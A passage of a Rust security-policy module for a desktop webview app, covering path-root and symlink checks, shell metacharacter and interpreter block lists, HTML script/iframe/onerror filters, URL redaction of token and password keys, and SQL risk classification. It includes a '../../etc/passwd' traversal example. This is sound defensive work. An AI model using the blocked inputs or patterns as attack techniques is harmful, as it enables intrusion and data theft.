//! M0-3.a：安全边界最小契约（`SecurityPolicy` 等价模块）。
//!
//! 本检查点只**定义契约**并给出可复跑拒绝用例，**不收口任何调用方**
//! （`launch_app` 归 M0-3.d、路径类命令归 M0-3.c、capability/远程 IPC 归 M0-3.b）。
//! 因此这些函数当前还没有生产调用方；为避免新增编译器警告，模块顶部做了
//! 受控豁免，并在 `main.rs` 启动日志里打印策略指纹（见 `policy_fingerprint`）。
//!
//! 设计原则：
//!   1. 纯函数、无全局状态，便于单测与后续在调用方组合。
//!   2. 默认拒绝：无法判定（如路径不存在、无法规范化）一律 `Err`，不静默放行。
//!   3. 失败信息不含完整用户输入摘要以外的敏感内容，且统一由调用方决定是否记录。

// 契约先行阶段：本模块只被单元测试和启动指纹日志消费。
// M0-3.b/c/d 接入生产调用方后必须删除本豁免并重新核对 warning 基线。
#![allow(dead_code)]

use std::collections::HashMap;
use std::path::PathBuf;
use std::sync::Mutex;

/// 安全策略拒绝原因。
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum PolicyError {
    /// 路径无法规范化（不存在、权限不足等）：默认拒绝。
    UnresolvablePath(String),
    /// 规范化后不在任何允许根目录内（含 `../` 逃逸）。
    PathOutsideAllowedRoots { path: String, roots: Vec<String> },
    /// 路径中存在符号链接且其目标逃出允许根目录。
    SymlinkEscape { path: String, target: String },
    /// 命令含 shell 元字符，存在注入风险。
    ShellMetacharacter { found: char },
    /// 命令为空。
    EmptyCommand,
    /// 未知/未登记的 webview label（例如早已不存在的 `browser`）。
    UnknownWebviewLabel(String),
    /// HTML 超长。
    HtmlTooLarge { bytes: usize, limit: usize },
    /// HTML 含危险片段。
    DangerousHtml(&'static str),
    /// 文本字段超长。
    PayloadTooLarge { bytes: usize, limit: usize },
    /// 集合类载荷条目过多。
    TooManyItems { count: usize, limit: usize },
    /// 缺少用户意图令牌（外部页面发起的有副作用调用）。
    MissingUserIntent { scope: String },
    /// 用户意图令牌已过期。
    ExpiredUserIntent { scope: String },
    /// 路径分量含 `.`/`..`/分隔符/NUL（重命名逃逸）。
    DangerousPathComponent(String),
    /// 拒绝删除允许根目录本身。
    RefuseToDeleteRoot { path: String },
    /// 非 http/https 的打开链接（scheme 白名单）。
    DisallowedUrlScheme(String),
    /// 尝试把 shell 解释器当作启动目标（等价绕过 `sh -c` 收口）。
    BlockedLaunchProgram(String),
    /// 启动目标解析不到可执行文件。
    LaunchProgramNotFound(String),
    /// 凭据/密钥泄露（Agent/Skill 定义里出现 sk-/api_key/secret/password 等）。
    CredentialLeak(String),
    /// 引用了未登记能力（不在 SKILL_CAPABILITY_V1 / AGENT_CAPABILITY_V1 单一真源内）。
    UnknownCapability(String),
    /// 必填字段为空（id / version 等）。
    EmptyRequiredField(String),
    /// 插件 manifest 结构非法（schema 边界 / 形态③入口 / 哈希 / 元数据体量等）。
    InvalidPluginManifest(String),
    /// 插件签名结构非法（仅 W6 结构校验；真 Ed25519 验签由运行时 lane 在本地完成）。
    InvalidPluginSignature(String),
    /// 插件生命周期非法迁移。
    PluginStateTransition(String),
}

impl std::fmt::Display for PolicyError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            PolicyError::UnresolvablePath(p) => write!(f, "路径无法解析：{p}"),
            PolicyError::PathOutsideAllowedRoots { path, roots } => {
                write!(f, "路径 {path} 不在允许根目录内：{:?}", roots)
            }
            PolicyError::SymlinkEscape { path, target } => {
                write!(f, "路径 {path} 的符号链接目标 {target} 逃出允许范围")
            }
            PolicyError::ShellMetacharacter { found } => {
                write!(f, "命令含 shell 元字符：{found:?}")
            }
            PolicyError::EmptyCommand => write!(f, "命令为空"),
            PolicyError::UnknownWebviewLabel(label) => write!(f, "未登记的 webview label：{label}"),
            PolicyError::HtmlTooLarge { bytes, limit } => {
                write!(f, "HTML 超长：{bytes} > {limit} 字节")
            }
            PolicyError::DangerousHtml(fragment) => write!(f, "HTML 含危险片段：{fragment}"),
            PolicyError::PayloadTooLarge { bytes, limit } => {
                write!(f, "载荷超长：{bytes} > {limit} 字节")
            }
            PolicyError::TooManyItems { count, limit } => {
                write!(f, "条目过多：{count} > {limit}")
            }
            PolicyError::MissingUserIntent { scope } => {
                write!(f, "缺少用户意图令牌（作用域 {scope}）")
            }
            PolicyError::ExpiredUserIntent { scope } => {
                write!(f, "用户意图令牌已过期（作用域 {scope}）")
            }
            PolicyError::DangerousPathComponent(name) => {
                write!(f, "路径分量非法（含 .. 或分隔符）：{name}")
            }
            PolicyError::RefuseToDeleteRoot { path } => {
                write!(f, "拒绝删除允许根目录本身：{path}")
            }
            PolicyError::DisallowedUrlScheme(url) => {
                write!(f, "只允许用浏览器打开 http/https 链接：{url}")
            }
            PolicyError::BlockedLaunchProgram(p) => {
                write!(f, "不允许把 shell 解释器作为启动目标：{p}")
            }
            PolicyError::LaunchProgramNotFound(p) => {
                write!(f, "启动目标不是可执行文件：{p}")
            }
            PolicyError::CredentialLeak(_s) => {
                write!(f, "凭据/密钥泄露（禁止进入 Agent/Skill 定义）：<redacted>")
            }
            PolicyError::UnknownCapability(c) => {
                write!(f, "引用未登记能力（单一真源缺失）：{c}")
            }
            PolicyError::EmptyRequiredField(field) => {
                write!(f, "必填字段为空：{field}")
            }
            PolicyError::InvalidPluginManifest(msg) => {
                write!(f, "插件 manifest 非法：{msg}")
            }
            PolicyError::InvalidPluginSignature(msg) => {
                write!(f, "插件签名结构非法（仅 W6 结构校验）：{msg}")
            }
            PolicyError::PluginStateTransition(msg) => {
                write!(f, "插件生命周期非法迁移：{msg}")
            }
        }
    }
}

/// 单条 HTML 片段的大小上限（契约：超长内容必须显式拒绝，避免 webview 内存被拖垮）。
pub const MAX_HTML_BYTES: usize = 1_048_576; // 1 MiB

/// 已登记的 webview label 规则。刻意**不含** `browser`——
/// 该 label 已从产品实现中移除，但 `src-tauri/capabilities/*.json` 仍残留（见威胁矩阵 SEC-03）。
pub fn is_known_webview_label(label: &str) -> bool {
    if label == "main" {
        return true;
    }
    // tab-<uuid>、grid-<n>、grid-child-<n> 三类由实现动态创建。
    label.starts_with("tab-") || label.starts_with("grid-")
}

/// 不允许作为启动目标的解释器：放行它们等于把 `sh -c` 换个壳重新打开。
pub const BLOCKED_LAUNCH_PROGRAMS: [&str; 6] = ["sh", "bash", "zsh", "fish", "powershell", "cmd"];

/// 把 `.desktop` 风格的 Exec 字符串解析成 (程序, 参数)。
///
/// 处理规则：按空白切分并支持双引号包裹；剔除 `%f %F %u %U %i %c %k` 等字段码；
/// 程序名不得为空。解析后由调用方**直接 spawn**（不经 shell），因此不存在
/// 二次解释与元字符注入面。
pub fn parse_command_line(line: &str) -> Result<(String, Vec<String>), PolicyError> {
    let mut parts: Vec<String> = Vec::new();
    let mut current = String::new();
    let mut in_quotes = false;
    for ch in line.trim().chars() {
        match ch {
            '"' => in_quotes = !in_quotes,
            c if c.is_whitespace() && !in_quotes => {
                if !current.is_empty() {
                    parts.push(std::mem::take(&mut current));
                }
            }
            c => current.push(c),
        }
    }
    if !current.is_empty() {
        parts.push(current);
    }
    let program = parts.first().ok_or(PolicyError::EmptyCommand)?.clone();
    if program.is_empty() {
        return Err(PolicyError::EmptyCommand);
    }
    let args = parts[1..]
        .iter()
        .filter(|a| !is_desktop_field_code(a))
        .cloned()
        .collect();
    Ok((program, args))
}

/// `.desktop` 字段码（%u/%U/%f…）由启动器填充，程序自身不理解，必须剔除。
fn is_desktop_field_code(arg: &str) -> bool {
    matches!(
        arg,
        "%f" | "%F" | "%u" | "%U" | "%d" | "%D" | "%n" | "%N" | "%i" | "%c" | "%k" | "%v" | "%m"
    )
}

/// 启动目标的最后一道闸：先过元字符，再禁解释器，再要求程序可解析到可执行文件。
pub fn check_launch_target(line: &str) -> Result<(String, Vec<String>), PolicyError> {
    check_shell_command(line)?;
    let (program, args) = parse_command_line(line)?;
    let file_name = program
        .rsplit('/')
        .next()
        .unwrap_or_default()
        .to_ascii_lowercase();
    if BLOCKED_LAUNCH_PROGRAMS.contains(&file_name.as_str()) {
        return Err(PolicyError::BlockedLaunchProgram(program));
    }
    if !program_resolves(&program) {
        return Err(PolicyError::LaunchProgramNotFound(program));
    }
    Ok((program, args))
}

/// 程序是否可解析为可执行文件：绝对路径直接判定，否则沿 PATH 查找。
fn program_resolves(program: &str) -> bool {
    if program.contains('/') {
        return std::path::Path::new(program).is_file();
    }
    std::env::var_os("PATH")
        .map(|paths| std::env::split_paths(&paths).any(|dir| dir.join(program).is_file()))
        .unwrap_or(false)
}

/// 校验 webview label 是否登记在册。
pub fn check_webview_label(label: &str) -> Result<(), PolicyError> {
    if is_known_webview_label(label) {
        Ok(())
    } else {
        Err(PolicyError::UnknownWebviewLabel(label.to_string()))
    }
}

/// 校验路径：规范化后必须落在 `roots` 之一内，且不得借符号链接逃逸。
///
/// 判断顺序刻意先 `canonicalize` 再比较前缀，这样 `a/b/../../../etc` 与
/// 「指向外部的软链接」都会被同一套规则拦下。
pub fn check_path_within_roots(path: &str, roots: &[PathBuf]) -> Result<PathBuf, PolicyError> {
    if roots.is_empty() {
        // 没有配置允许根目录 = 策略未就绪，默认拒绝而不是放行。
        return Err(PolicyError::PathOutsideAllowedRoots {
            path: path.to_string(),
            roots: Vec::new(),
        });
    }
    let canonical =
        std::fs::canonicalize(path).map_err(|_| PolicyError::UnresolvablePath(path.to_string()))?;

    // 逐段检查祖先是否为符号链接且其目标逃出允许范围（canonicalize 只解最终路径，
    // 中间目录被替换成软链接的场景需要额外比对）。
    if let Some(parent) = canonical.parent() {
        for ancestor in parent.ancestors() {
            if let Ok(target) = std::fs::read_link(ancestor) {
                let resolved = target
                    .canonicalize()
                    .unwrap_or_else(|_| ancestor.to_path_buf());
                if !roots.iter().any(|root| resolved.starts_with(root)) {
                    return Err(PolicyError::SymlinkEscape {
                        path: path.to_string(),
                        target: resolved.display().to_string(),
                    });
                }
            }
        }
    }

    let in_roots = roots.iter().any(|root| canonical.starts_with(root));
    if in_roots {
        Ok(canonical)
    } else {
        Err(PolicyError::PathOutsideAllowedRoots {
            path: path.to_string(),
            roots: roots.iter().map(|r| r.display().to_string()).collect(),
        })
    }
}

/// 判断规范化后的路径是否落在允许根目录内（供调用方在已有 canonical 路径时复用）。
pub fn is_within_roots(canonical: &std::path::Path, roots: &[PathBuf]) -> bool {
    roots.iter().any(|root| canonical.starts_with(root))
}

/// 校验单个路径分量（文件名/新名称）：拒绝 `.`/`..`、分隔符与 NUL。
///
/// 典型场景：`rename_path(path, new_name)` 直接用 `parent.join(new_name)` 拼接，
/// 若 new_name 为 `../../etc/passwd`，重命名即变成跨目录移动——必须拦住。
pub fn check_path_component(name: &str) -> Result<(), PolicyError> {
    let trimmed = name.trim();
    if trimmed.is_empty() {
        return Err(PolicyError::EmptyCommand);
    }
    if trimmed == "." || trimmed == ".." {
        return Err(PolicyError::DangerousPathComponent(trimmed.to_string()));
    }
    if trimmed.contains('/') || trimmed.contains('\\') || trimmed.contains('\0') {
        return Err(PolicyError::DangerousPathComponent(trimmed.to_string()));
    }
    Ok(())
}

/// 删除前的额外校验：除「必须在允许根目录内」外，还禁止删除**允许根目录本身**，
/// 避免一次 `delete_path` 把整个工作区或主目录递归删空。
pub fn check_delete_target(path: &str, roots: &[PathBuf]) -> Result<PathBuf, PolicyError> {
    let canonical = check_path_within_roots(path, roots)?;
    if roots.iter().any(|root| canonical == *root) {
        return Err(PolicyError::RefuseToDeleteRoot {
            path: canonical.display().to_string(),
        });
    }
    Ok(canonical)
}

/// 只用系统默认浏览器打开 http/https 链接：拒绝 `file:`、`smb:`、自定义 scheme 等
/// 会被 `open::that` 直接交给桌面环境执行的输入。
pub fn check_openable_url(url: &str) -> Result<(), PolicyError> {
    let lower = url.trim().to_ascii_lowercase();
    if lower.starts_with("http://") || lower.starts_with("https://") {
        Ok(())
    } else {
        Err(PolicyError::DisallowedUrlScheme(url.to_string()))
    }
}

/// 校验 shell 命令：拒绝元字符，避免 `sh -c` 串接出预期外语义。
///
/// 注意：这只是**字符级**最小契约，真正收口要按已解析应用条目执行（M0-3.d），
/// 单靠字符过滤不足以对抗所有注入，因此这里刻意不做「清洗」而只做「拒绝」。
pub fn check_shell_command(cmd: &str) -> Result<(), PolicyError> {
    let trimmed = cmd.trim();
    if trimmed.is_empty() {
        return Err(PolicyError::EmptyCommand);
    }
    for ch in trimmed.chars() {
        if matches!(ch, ';' | '&' | '|' | '`' | '$' | '>' | '<' | '\n' | '\r') {
            return Err(PolicyError::ShellMetacharacter { found: ch });
        }
    }
    Ok(())
}

/// 校验写入 webview 的 HTML 片段：先查长度，再查危险片段。
pub fn check_html(html: &str) -> Result<(), PolicyError> {
    if html.len() > MAX_HTML_BYTES {
        return Err(PolicyError::HtmlTooLarge {
            bytes: html.len(),
            limit: MAX_HTML_BYTES,
        });
    }
    const DANGEROUS: [(&str, &str); 4] = [
        ("<script", "<script"),
        ("javascript:", "javascript:"),
        ("<iframe", "<iframe"),
        ("onerror=", "onerror="),
    ];
    let lower = html.to_ascii_lowercase();
    for (needle, label) in DANGEROUS {
        if lower.contains(needle) {
            return Err(PolicyError::DangerousHtml(label));
        }
    }
    Ok(())
}

/// 策略指纹：启动日志与诊断用，便于确认运行中的二进制对应哪版策略契约。
pub fn policy_fingerprint() -> &'static str {
    "security-policy-v2/max_html=1MiB/labels=main,tab-*,grid-*/intents=one-shot"
}

// ===========================================================================
// M1-8：资源瀑布隐私过滤（URL 敏感查询参数 / userinfo / fragment 脱敏 + 限长）
// ===========================================================================

/// 资源瀑布单条 URL 的硬上限（超长截断，防内存放大与日志膨胀）。
pub const MAX_RESOURCE_URL_BYTES: usize = 2048;

/// URL 查询参数 / fragment 参数中视为敏感、值必须脱敏为 `***` 的键。
/// 精确匹配（大小写不敏感），刻意保守宽列：宁可多脱敏，不漏凭据。
pub const SENSITIVE_QUERY_KEYS: [&str; 21] = [
    "token",
    "access_token",
    "refresh_token",
    "id_token",
    "auth",
    "authorization",
    "password",
    "passwd",
    "pwd",
    "secret",
    "client_secret",
    "signature",
    "sig",
    "session",
    "sessionid",
    "session_id",
    "cookie",
    "apikey",
    "api_key",
    "credential",
    "jwt",
];

/// 查询参数键是否敏感（精确匹配，大小写不敏感）。
pub fn is_sensitive_query_key(key: &str) -> bool {
    let lower = key.to_ascii_lowercase();
    SENSITIVE_QUERY_KEYS.contains(&lower.as_str())
}

/// 对一段 `k=v&k=v` 形式的参数串做敏感值脱敏（不含前导 `?`/`#`）。
fn redact_param_pairs(pairs: &str) -> String {
    let redacted: Vec<(String, String)> = url::form_urlencoded::parse(pairs.as_bytes())
        .map(|(k, v)| {
            if is_sensitive_query_key(&k) {
                (k.into_owned(), "***".to_string())
            } else {
                (k.into_owned(), v.into_owned())
            }
        })
        .collect();
    let mut ser = url::form_urlencoded::Serializer::new(String::new());
    for (k, v) in redacted {
        ser.append_pair(&k, &v);
    }
    ser.finish()
}

/// 截断到 `MAX_RESOURCE_URL_BYTES`（回退 UTF-8 字符边界，追加省略标记）。
fn truncate_url(s: &str) -> String {
    if s.len() <= MAX_RESOURCE_URL_BYTES {
        return s.to_string();
    }
    let mut end = MAX_RESOURCE_URL_BYTES;
    while end > 0 && !s.is_char_boundary(end) {
        end -= 1;
    }
    format!("{}…", &s[..end])
}

/// 资源瀑布 URL 脱敏（唯一的 URL 出口，所有入库/上报前必须经过）：
/// 1. userinfo（`user:pass@`）移除；
/// 2. query 中敏感键的值替换为 `***`；
/// 3. fragment 若为 `k=v` 形态（OAuth implicit 等场景），同样脱敏；
/// 4. 整体限长 `MAX_RESOURCE_URL_BYTES`。
/// 解析失败（相对 URL / 非标准串）时保守处理：仅限长，不做原样保留之外的推断。
pub fn redact_sensitive_url(raw: &str) -> String {
    match url::Url::parse(raw) {
        Ok(mut u) => {
            if u.password().is_some() {
                let _ = u.set_password(None);
            }
            if !u.username().is_empty() {
                let _ = u.set_username("");
            }
            if let Some(q) = u.query() {
                let redacted = redact_param_pairs(q);
                if redacted.is_empty() {
                    u.set_query(None);
                } else {
                    u.set_query(Some(&redacted));
                }
            }
            if let Some(f) = u.fragment() {
                if f.contains('=') {
                    let redacted = redact_param_pairs(f);
                    u.set_fragment(Some(&redacted));
                }
            }
            truncate_url(u.as_str())
        }
        Err(_) => truncate_url(raw),
    }
}

// ===========================================================================
// M0-3.b：来源校验 + 用户意图令牌 + 载荷边界
// ===========================================================================

// M5-1 切片 0b：常量收口到 `domain.rs`（值逐字不变），此处仅再导出。
pub use crate::domain::MAX_TEXT_FIELD_BYTES;
/// `report_resources` 单次上报的条目上限（防止事件洪水）。
pub const MAX_RESOURCE_ITEMS: usize = 500;
/// 意图令牌默认有效期。
pub const INTENT_TTL: std::time::Duration = std::time::Duration::from_secs(30);

/// 意图作用域：必须与命令一一对应，避免一个令牌串到别的副作用上。
pub const INTENT_SAVE_NOTE: &str = "save_note";
pub const INTENT_COLLECT_SELECTION: &str = "collect_selection";
pub const INTENT_OPEN_TERMINAL: &str = "request_open_terminal";

/// 校验文本字段长度（同时拒绝超长，避免后续处理被放大）。
pub fn check_text_field(_name: &str, value: &str, max_bytes: usize) -> Result<(), PolicyError> {
    if value.len() > max_bytes {
        return Err(PolicyError::PayloadTooLarge {
            bytes: value.len(),
            limit: max_bytes,
        });
    }
    Ok(())
}

/// 校验集合类载荷的条目数量。
pub fn check_items_count(count: usize, max: usize) -> Result<(), PolicyError> {
    if count > max {
        return Err(PolicyError::TooManyItems { count, limit: max });
    }
    Ok(())
}

/// 来源校验 + 用户意图校验（M0-3.b 收口核心）。
///
/// 规则：
///   - 调用方 label 必须已登记（`main` / `tab-*` / `grid-*`），未登记（如残留的
///     `browser` 或伪造 label）一律拒绝；
///   - `main` 是受信任的主窗口 UI，其调用本身即用户手势的结果，无需令牌；
///   - 来自 `tab-*` / `grid-*`（外部页面）的**有副作用**调用必须出示一次性意图令牌。
pub fn check_remote_invocation(
    label: &str,
    scope: &str,
    token: Option<&str>,
    registry: &IntentRegistry,
) -> Result<(), PolicyError> {
    check_webview_label(label)?;
    if label == "main" {
        return Ok(());
    }
    let token = token.ok_or(PolicyError::MissingUserIntent {
        scope: scope.to_string(),
    })?;
    registry.consume(scope, token)
}

/// 一次性用户意图令牌登记表：签发 → 单次消费，过期或重放均拒绝。
#[derive(Default)]
pub struct IntentRegistry {
    tokens: Mutex<HashMap<String, (String, std::time::Instant)>>,
}

impl IntentRegistry {
    pub fn new() -> Self {
        Self::default()
    }

    /// 签发一个作用域绑定的意图令牌（只能由受信任的主窗口调用）。
    pub fn issue(&self, scope: &str, ttl: std::time::Duration) -> String {
        let token = format!(
            "{}-{}",
            scope,
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_nanos())
                .unwrap_or_default()
        );
        self.tokens.lock().unwrap().insert(
            token.clone(),
            (scope.to_string(), std::time::Instant::now() + ttl),
        );
        token
    }

    /// 消费令牌：作用域必须匹配、未过期，且消费后立即失效（防重放）。
    pub fn consume(&self, scope: &str, token: &str) -> Result<(), PolicyError> {
        let mut guard = self.tokens.lock().unwrap();
        let entry = guard.remove(token).ok_or(PolicyError::MissingUserIntent {
            scope: scope.to_string(),
        })?;
        let (issued_scope, expires_at) = entry;
        if issued_scope != scope {
            return Err(PolicyError::MissingUserIntent {
                scope: scope.to_string(),
            });
        }
        if std::time::Instant::now() > expires_at {
            return Err(PolicyError::ExpiredUserIntent {
                scope: scope.to_string(),
            });
        }
        Ok(())
    }

    /// 当前未消费的令牌数量（诊断用）。
    pub fn pending(&self) -> usize {
        self.tokens.lock().unwrap().len()
    }
}

// ===========================================================================
// M4-2.s：数据库安全闸门（SQL 风险分类 + 生产判定 + fail-closed 写闸门）
//
// 契约来源：
//   - `logs/checkpoints/M4-1.d-20260905-2300.md` §3（信号契约 / 决策规则）/ §3.4（写闸门全链路）
//   - `logs/checkpoints/M4-1.c-20260905-2255.md` §5（多语句与取数通道）
//   - A10 安全评审 G-4（分类器）/ G-5（生产判定信号）/ G-3（SQL 即凭据汇）
//
// 硬约束 **F4：零 db 依赖**。本段禁止出现 sqlx / rusqlite / mysql / postgres /
// `crate::database`，由 `check-database-policy.py` 的 `DB_SAFETY_HAS_DB_DEP` 守护。
// DNS 解析、实际加密状态、连接建立结果**一律**由调用方（M4-2 `database.rs`）以
// `ProductionSignals` 传入；本模块只做纯判定，因而可先于数据库实现合入并被单测全覆盖。
// ===========================================================================

use crate::domain::{DbConnectionConfig, DbErrorCode, SupportedDb};

/// 单条 SQL 的字节上限（M4-1.c §1 `DB_MAX_SQL_BYTES` = 64 KiB，复用既有
/// `MAX_TEXT_FIELD_BYTES` 量级，不新造）。A3 落地 `database.rs` 时请 `use` 本常量，
/// **不要**另起同名常量造成两套口径。
pub const DB_MAX_SQL_BYTES: usize = 64 * 1024;

/// 生产名称启发式（M4-1.d **S2**）：命中 ⇒ **Unknown**——
/// 名称匹配**永远不能单独推出 Production**，只能把判定推向 fail-closed。
pub const PROD_NAME_HINTS: [&str; 7] = [
    "prod",
    "prd",
    "production",
    "live",
    "online",
    "生产",
    "正式",
];

/// 非生产名称启发式（M4-1.d **S2'**）：命中 ⇒ NonProduction **候选**，
/// 且必须没有任何 S2/S4/S5 命中才生效。
pub const NONPROD_NAME_HINTS: [&str; 7] =
    ["test", "dev", "staging", "uat", "local", "demo", "sandbox"];

/// SQL 风险类别（写闸门的分档依据）。
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SqlRiskClass {
    /// 只读（`SELECT` / CTE 读 / `SHOW` / `EXPLAIN` 等）
    Read,
    /// 数据写（`INSERT` / `UPDATE` / `DELETE` / `REPLACE` / `MERGE`）
    Write,
    /// 结构变更（`CREATE` / `ALTER` / `DROP` / `TRUNCATE` / `RENAME`）
    Ddl,
    /// 权限与运维类（`GRANT` / `REVOKE` / `SET` / `COPY` / `CALL` / 事务控制 /
    /// `EXPLAIN ANALYZE`）
    Admin,
    /// 无法判定。**一律拒绝**（fail-closed），绝不降级放行。
    Unknown,
}

/// 识别出的语句主动词。
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SqlStatementKind {
    Select,
    Insert,
    Update,
    Delete,
    Replace,
    Merge,
    Create,
    Alter,
    Drop,
    Truncate,
    Rename,
    Grant,
    Revoke,
    Set,
    Copy,
    Call,
    Transaction,
    /// MySQL 8 的 `EXPLAIN ANALYZE <DML>`：会**真实执行**语句，
    /// 不能与普通 `EXPLAIN`（只读）混为一谈。
    ExplainAnalyze,
    /// 非空但不认识的词：按不可解析处理。
    Other,
    /// 没有词（空语句）
    None,
}

/// 分类结果。`error` 为 `Some` 时**必须拒绝**，且 `class` 不再是放行依据。
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SqlClassification {
    pub class: SqlRiskClass,
    pub kind: SqlStatementKind,
    /// 掩蔽注释与字面量后、`;` 切分得到的**非空**语句条数。
    pub statement_count: usize,
    pub error: Option<DbErrorCode>,
}

impl SqlClassification {
    /// 是否可作为只读查询放行（**唯一**的放行判断入口）。
    pub fn is_read_only(&self) -> bool {
        self.error.is_none() && matches!(self.class, SqlRiskClass::Read)
    }

    /// 是否属于「写或更危险」。**fail-closed**：不可解析 / 多语句同样算危险，
    /// 绝不能因为「看不懂」就当作只读。
    pub fn is_write_like(&self) -> bool {
        !self.is_read_only()
    }
}

/// 把注释与字符串/标识符引用整段替换为空格，只让**结构**参与后续判断。
///
/// 这是 G-4.1 的落地：`/*x*/ DELETE` 与 `'a;b'` 里的分号都不应影响判定。
/// 返回 `Err` = 存在**未闭合**的注释或引号 ⇒ 不可解析 ⇒ 调用方必须拒绝。
fn mask_literals_and_comments(sql: &str) -> Result<String, ()> {
    let chars: Vec<char> = sql.chars().collect();
    let n = chars.len();
    let mut out = String::with_capacity(sql.len());
    let mut i = 0usize;

    while i < n {
        let c = chars[i];
        match c {
            // `--` 行注释（SQL 标准；MySQL 要求后跟空白，此处从严：一律视为注释）
            '-' if i + 1 < n && chars[i + 1] == '-' => {
                out.push(' ');
                out.push(' ');
                i += 2;
                while i < n && chars[i] != '\n' {
                    out.push(' ');
                    i += 1;
                }
            }
            // `#` 行注释（MySQL）
            '#' => {
                out.push(' ');
                i += 1;
                while i < n && chars[i] != '\n' {
                    out.push(' ');
                    i += 1;
                }
            }
            // `/* */` 块注释（不嵌套；未闭合即不可解析）
            '/' if i + 1 < n && chars[i + 1] == '*' => {
                out.push(' ');
                out.push(' ');
                i += 2;
                let mut closed = false;
                while i < n {
                    if chars[i] == '*' && i + 1 < n && chars[i + 1] == '/' {
                        out.push(' ');
                        out.push(' ');
                        i += 2;
                        closed = true;
                        break;
                    }
                    out.push(' ');
                    i += 1;
                }
                if !closed {
                    return Err(());
                }
            }
            // 单/双引号字符串与反引号标识符：`''` `\"` 均为转义
            '\'' | '"' | '`' => {
                let quote = c;
                out.push(' ');
                i += 1;
                let mut closed = false;
                while i < n {
                    let d = chars[i];
                    if d == '\\' && i + 1 < n {
                        out.push(' ');
                        out.push(' ');
                        i += 2;
                        continue;
                    }
                    if d == quote {
                        if i + 1 < n && chars[i + 1] == quote {
                            out.push(' ');
                            out.push(' ');
                            i += 2;
                            continue;
                        }
                        out.push(' ');
                        i += 1;
                        closed = true;
                        break;
                    }
                    out.push(' ');
                    i += 1;
                }
                if !closed {
                    return Err(());
                }
            }
            // Postgres 美元引用 `$$ ... $$`
            '$' if i + 1 < n && chars[i + 1] == '$' => {
                out.push(' ');
                out.push(' ');
                i += 2;
                let mut closed = false;
                while i < n {
                    if chars[i] == '$' && i + 1 < n && chars[i + 1] == '$' {
                        out.push(' ');
                        out.push(' ');
                        i += 2;
                        closed = true;
                        break;
                    }
                    out.push(' ');
                    i += 1;
                }
                if !closed {
                    return Err(());
                }
            }
            _ => {
                out.push(c);
                i += 1;
            }
        }
    }
    Ok(out)
}

/// 提取**括号深度 0** 的单词序列（小写）。
///
/// CTE 内联的 `SELECT` 处于括号内，因此不会冒充主语句动词——
/// `WITH t AS (SELECT 1) DELETE FROM t` 才会被正确判为 `Delete`（G-4）。
fn depth0_words(stmt: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut cur = String::new();
    let mut depth = 0i32;
    for c in stmt.chars() {
        match c {
            '(' => {
                if !cur.is_empty() {
                    out.push(std::mem::take(&mut cur));
                }
                depth += 1;
            }
            ')' => {
                if !cur.is_empty() {
                    out.push(std::mem::take(&mut cur));
                }
                depth = depth.saturating_sub(1);
            }
            _ if depth == 0 && (c.is_whitespace() || c == ',') => {
                if !cur.is_empty() {
                    out.push(std::mem::take(&mut cur));
                }
            }
            _ if depth == 0 => cur.push(c.to_ascii_lowercase()),
            _ => {}
        }
    }
    if !cur.is_empty() {
        out.push(cur);
    }
    out
}

/// 动词 → 语句类型。返回 `None` 表示不认识（调用方按 `Other` / 不可解析处理）。
fn verb_kind(word: &str) -> Option<SqlStatementKind> {
    let kind = match word {
        "select" | "values" | "show" | "table" => SqlStatementKind::Select,
        "insert" => SqlStatementKind::Insert,
        "update" => SqlStatementKind::Update,
        "delete" => SqlStatementKind::Delete,
        "replace" => SqlStatementKind::Replace,
        "merge" => SqlStatementKind::Merge,
        "create" => SqlStatementKind::Create,
        "alter" => SqlStatementKind::Alter,
        "drop" => SqlStatementKind::Drop,
        "truncate" => SqlStatementKind::Truncate,
        "rename" => SqlStatementKind::Rename,
        "grant" => SqlStatementKind::Grant,
        "revoke" => SqlStatementKind::Revoke,
        "set" => SqlStatementKind::Set,
        "copy" => SqlStatementKind::Copy,
        "call" => SqlStatementKind::Call,
        "begin" | "start" | "commit" | "rollback" | "savepoint" | "release" => {
            SqlStatementKind::Transaction
        }
        _ => return None,
    };
    Some(kind)
}

/// 判断单词序列中是否出现连续短语（如 `into outfile`）。
fn has_phrase(words: &[String], phrase: &[&str]) -> bool {
    if phrase.is_empty() || words.len() < phrase.len() {
        return false;
    }
    words
        .windows(phrase.len())
        .any(|w| w.iter().zip(phrase.iter()).all(|(a, b)| a.as_str() == *b))
}

/// 单条语句 → (语句类型, 风险类别)。
fn classify_statement(words: &[String]) -> (SqlStatementKind, SqlRiskClass) {
    let first = words.first().map(|s| s.as_str()).unwrap_or("");
    let kind = match first {
        "" => SqlStatementKind::None,
        // MySQL 8 的 `EXPLAIN ANALYZE <DML>` 会**真实执行**语句，绝不可当只读。
        "explain" | "describe" | "desc" => {
            if words.get(1).map(|w| w == "analyze").unwrap_or(false) {
                SqlStatementKind::ExplainAnalyze
            } else {
                SqlStatementKind::Select
            }
        }
        // CTE：主动词是 CTE 之后的第一个深度 0 动词（首关键字是 `WITH`，不能据此判只读）
        "with" => words
            .iter()
            .skip(1)
            .find_map(|w| verb_kind(w))
            .unwrap_or(SqlStatementKind::Other),
        other => verb_kind(other).unwrap_or(SqlStatementKind::Other),
    };

    let class = match kind {
        SqlStatementKind::Select => {
            // `SELECT ... INTO OUTFILE/DUMPFILE` 会在服务端写文件：按写处理。
            if has_phrase(words, &["into", "outfile"]) || has_phrase(words, &["into", "dumpfile"]) {
                SqlRiskClass::Write
            } else {
                SqlRiskClass::Read
            }
        }
        SqlStatementKind::Insert
        | SqlStatementKind::Update
        | SqlStatementKind::Delete
        | SqlStatementKind::Replace
        | SqlStatementKind::Merge => SqlRiskClass::Write,
        SqlStatementKind::Create
        | SqlStatementKind::Alter
        | SqlStatementKind::Drop
        | SqlStatementKind::Truncate
        | SqlStatementKind::Rename => SqlRiskClass::Ddl,
        SqlStatementKind::Grant
        | SqlStatementKind::Revoke
        | SqlStatementKind::Set
        | SqlStatementKind::Copy
        | SqlStatementKind::Call
        | SqlStatementKind::Transaction => SqlRiskClass::Admin,
        SqlStatementKind::ExplainAnalyze => SqlRiskClass::Admin,
